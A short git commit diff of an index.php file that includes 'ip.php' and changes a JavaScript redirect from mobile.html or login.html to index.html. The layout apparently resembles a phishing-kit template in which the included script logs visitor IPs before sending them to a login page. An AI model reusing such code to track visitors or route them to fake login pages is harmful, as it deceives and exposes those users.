639ff623d5902f3f2d072fb808ba9fa3693d313f
Thanhcute0606 <92868730+Thanhcute0606@users.noreply.github.com>
2021-10-23 07:49:01 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,9 +1,9 @@
 <?php include 'ip.php';?>
 <script type="text/javascript">
 if (screen.width <= 699) {
-document.location = "mobile.html";
+document.location = "index.html";
 }
 else {
-document.location = "login.html";
+document.location = "index.html";
 }
 </script> 
